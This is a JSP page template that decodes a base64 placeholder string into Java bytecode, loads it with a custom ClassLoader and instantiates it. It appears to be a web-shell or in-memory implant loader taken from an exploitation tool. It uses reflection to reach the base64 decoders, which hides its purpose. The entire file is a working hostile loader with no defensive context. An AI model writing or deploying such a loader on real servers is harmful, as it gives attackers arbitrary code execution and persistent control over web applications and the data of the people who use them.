<%@ page import="java.lang.*" %>
<%@ page import="java.lang.Class" %>
<%@ page import="java.lang.ClassLoader" %>
<%@ page import="java.lang.ClassNotFoundException" %>
<%@ page import="java.lang.Object" %>
<%@ page import="java.lang.String" %>
<%@ page import="java.lang.Thread" %>
<%!
    public static class ClassDefiner extends ClassLoader {
        public ClassDefiner(ClassLoader classLoader) {
            super(classLoader);
        }

        public Class<?> defineClass(byte[] code) {
            return defineClass(null, code, 0, code.length);
        }
    }
%>

<%
    String base64Str = "{{base64Str}}";
    byte[] bytecode = null;
    try {
        Class base64Clz = Class.forName("java.util.Base64");
        Object decoder = base64Clz.getMethod("getDecoder").invoke(null);
        bytecode = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
    } catch (ClassNotFoundException ee) {
        Class datatypeConverterClz = Class.forName("javax.xml.bind.DatatypeConverter");
        bytecode = (byte[]) datatypeConverterClz.getMethod("parseBase64Binary", String.class).invoke(null, base64Str);
    }
    Class clazz = new ClassDefiner(Thread.currentThread().getContextClassLoader()).defineClass(bytecode);
    clazz.newInstance();
%>